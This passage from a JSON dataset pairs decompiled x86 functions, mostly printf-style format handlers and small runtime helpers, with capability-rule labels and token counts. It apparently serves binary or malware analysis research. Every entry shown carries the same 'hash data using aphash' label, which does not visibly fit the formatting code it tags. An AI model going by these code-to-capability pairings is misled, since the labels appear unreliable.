*(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.0040549d(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004020bd(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1725
    },
    "00401f05": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00401f05(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a1164:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a1168:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a116b:\n            cVar4 = fcn.00401e33(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a1110:\n                arg_8h = 0x10;\n                goto code_r0x004a116b;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a1124;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a10f8;\n                }\n            }\ncode_r0x004a1174:\n            cVar4 = fcn.0040100f();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405e8e();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a1174;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a1124:\n            cVar4 = fcn.00402fd1(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004067c6();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a1174;\n            if (cVar4 == 'i') goto code_r0x004a1164;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403558();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004043fe();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a1110;\n            }\n            goto code_r0x004a1168;\n        }\ncode_r0x004a10f8:\n        cVar4 = fcn.00404d2c();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a11fa;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a11fa:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.0040549d(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401843(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00404039(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1678
    },
    "00401f1e": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f1e(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    int32_t arg_10h_00;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = ((*(arg_18h + 4) == '\\0') - 1 & 0x1d) + 0x17;\n    if (arg_ch < 0x41) {\n        if (*arg_8h == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar6 = arg_8h[1];\n        }\n        if (*arg_8h < 2) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = arg_8h[2];\n        }\n        var_ch = arg_14h ^ 1;\n        iVar3 = CONCAT44(uVar5, uVar6);\n    }\n    else {\n        uVar8 = arg_ch >> 5;\n        arg_ch = arg_ch & 0x1f;\n        iVar7 = uVar8 - 2;\n        uVar5 = iVar7 * 0x20;\n        uVar6 = arg_8h[uVar8 - 1];\n        puVar1 = arg_8h + uVar8;\n        if (arg_ch == 0) {\n            arg_10h_00 = uVar5 + arg_10h_00;\n            puVar2 = arg_8h + (uVar8 - 1);\n            uVar4 = arg_14h ^ 1;\n            var_ch = (uVar5 & 0xffffff00 | arg_14h) ^ 1;\n            iVar3 = CONCAT44(*puVar1, *puVar2);\n            if (iVar7 != 0) {\n                do {\n                    arg_8h = arg_8h + 1;\n                    uVar4 = uVar4 & (*arg_8h != 0) - 1U;\n                    iVar7 = iVar7 + -1;\n                } while (iVar7 != 0);\n                var_ch = uVar5 & 0xffffff00 | uVar4;\n                iVar3 = CONCAT44(*puVar1, *puVar2);\n            }\n        }\n        else {\n            uVar4 = 1;\n            arg_10h_00 = uVar5 + arg_ch + arg_10h_00;\n            iVar9 = fcn.00404147();\n            iVar10 = fcn.00404147();\n            iVar11 = fcn.00401b8b();\n            if ((arg_14h != 0) || (((1 << arg_ch) - 1U & uVar6) != 0)) {\n                uVar4 = 0;\n            }\n            var_ch = uVar5 & 0xffffff00 | uVar4;\n            for (; iVar3 = iVar9 + iVar10 + iVar11,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                arg_8h = arg_8h + 1;\n                uVar4 = uVar4 & (*arg_8h != 0) - 1U;\n                var_ch = var_ch & 0xffffff00 | uVar4;\n            }\n        }\n    }\n    fcn.00406906(iVar3, iVar3 >> 0x20, arg_10h_00, arg_10h, var_ch, arg_18h);\n    return;\n}\n",
        "token_count": 905
    },
    "004026fd": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004026fd(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a2319:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a231d:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a2320:\n            cVar5 = fcn.0040157d(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a22c5:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a2320;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a22d9;\n                if (uVar7 < 0x45) goto code_r0x004a24a9;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a24a9;\n                    goto code_r0x004a22ad;\n                }\n            }\ncode_r0x004a2329:\n            cVar5 = fcn.004051eb();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00402905();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a2329;\n            if (uVar7 != 99) goto code_r0x004a24a9;\ncode_r0x004a22d9:\n            cVar5 = fcn.004065ff(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.004023dd();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a2329;\n            if (uVar7 == 0x69) goto code_r0x004a2319;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.004064d8();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a24a9;\n                cVar5 = fcn.00401e56();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a24a9;\n                arg_ch_00 = 0;\n                goto code_r0x004a22c5;\n            }\n            goto code_r0x004a231d;\n        }\ncode_r0x004a22ad:\n        cVar5 = fcn.00401875();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004a24a9;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a23b4;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a23b4:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402978(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403fbc(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.00403945(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403fbc(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a24a9:\n    fcn.004030bc(unaff_ESI);\n    return;\n}\n",
        "token_count": 1726
    },
    "00402248": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402248(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00402356(8, 0);\n    return;\n}\n",
        "token_count": 90
    },
    "004023a6": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004023a6(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0388:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a038c:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a038f:\n            cVar4 = fcn.00402e96(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a0334:\n                arg_8h = 0x10;\n                goto code_r0x004a038f;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0348;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a031c;\n                }\n            }\ncode_r0x004a0398:\n            cVar4 = fcn.00404a89();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404c7d();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0398;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0348:\n            cVar4 = fcn.00404c73(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00402351();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0398;\n            if (cVar4 == 'i') goto code_r0x004a0388;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004023c4();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.0040468d();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a0334;\n            }\n            goto code_r0x004a038c;\n        }\ncode_r0x004a031c:\n        cVar4 = fcn.00403fcb();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a041e;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a041e:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405ef2(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004012f3(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1691
    },
    "00402644": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402644(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00404b92(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00402662": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402662(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004043ae(8, 0);\n    return;\n}\n",
        "token_count": 90
    },
    "004028f6": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004028f6(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004069ce(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "004028fb": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004028fb(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0917:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x004a091b:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a091e:\n            cVar4 = fcn.00404b92(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a08c3:\n                arg_8h = 0x10;\n                goto code_r0x004a091e;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a08d7;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a08ab;\n                }\n            }\ncode_r0x004a0927:\n            cVar4 = fcn.004039d6();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00401d39();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0927;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a08d7:\n            cVar4 = fcn.00401fa0(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00401136();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0927;\n            if (cVar4 == 'i') goto code_r0x004a0917;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004044e9();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00402644();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a08c3;\n            }\n            goto code_r0x004a091b;\n        }\ncode_r0x004a08ab:\n        cVar4 = fcn.0040213a();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x004a09ad;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a09ad:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405ef2(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404b33(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403d6e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1692
    },
    "004029be": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004029be(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puVar2 = &var_20h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00402f95": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031",
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402f95(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a1a2a:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a1a2e:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1a31:\n            cVar5 = fcn.004069ce(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a19d6:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1a31;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a19ea;\n                if (uVar7 < 0x45) goto code_r0x004a1bba;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a1bba;\n                    goto code_r0x004a19be;\n                }\n            }\ncode_r0x004a1a3a:\n            cVar5 = fcn.0040684d();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00406244();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a1a3a;\n            if (uVar7 != 99) goto code_r0x004a1bba;\ncode_r0x004a19ea:\n            cVar5 = fcn.0040101e(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00406758();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a1a3a;\n            if (uVar7 == 0x69) goto code_r0x004a1a2a;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00402063();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a1bba;\n                cVar5 = fcn.004028f6();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a1bba;\n                arg_ch_00 = 0;\n                goto code_r0x004a19d6;\n            }\n            goto code_r0x004a1a2e;\n        }\ncode_r0x004a19be:\n        cVar5 = fcn.00402d92();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004a1bba;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    